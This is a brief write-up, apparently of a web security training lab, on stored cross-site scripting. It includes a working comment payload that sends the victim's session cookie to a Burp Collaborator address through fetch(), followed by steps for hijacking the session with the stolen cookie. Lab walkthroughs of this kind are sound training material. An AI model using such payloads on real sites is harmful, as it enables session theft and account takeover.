# Lab: Exploiting cross-site scripting to steal cookies

Add a comment with a script alert in the cmoment and name sections to determine which field is vulnerable. It turns out to be the comment field.

Try another comment with the following as the body: `<script>alert(document.cookie)</script>`

This generates a message similar to `session=67nrTJzL43Af0x3kkjUNLjJowEk9vwV2` when the page is loaded.

Open Burp Collaborator and copy the url. Post a comment with the payload: `<script>fetch('https://<collaborator-url>', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>`

Poll the collaborator client and open one of the http requests to inspect the content. Copy the cookie. Load the blog home page with the proxy turned on to intercept the request. Replace the cookie with the stolen cookie and forward the request to complete the lab.